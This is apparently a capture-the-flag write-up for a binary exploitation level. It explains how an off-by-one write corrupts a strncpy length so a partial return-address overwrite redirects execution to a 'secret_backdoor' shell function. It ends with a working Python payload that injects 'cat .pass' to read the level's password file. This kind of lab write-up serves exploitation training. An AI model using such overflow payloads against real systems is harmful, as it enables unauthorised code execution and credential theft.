The problem with this program is that it copy 41 bytes we have written into a space of 40 bytes.
So it allows us to overwrite the 41th bytes. This byte match with the lenght that is use by strncpy.

We can overwrite the eip of the return address of the function "handle_msg" by changing the 41th bytes
with a high byte value. Next we only need to change the two lowest bytes of the eip of ret with
the last two bytes of the function secret_backdoor (that launch a shell).

$> python -c 'print("A" * 40 + "\xca" + "A" * 158 + "cd ../end && cat .pass;" + "B" * 105 + "\x8c\x48")' | ./level09
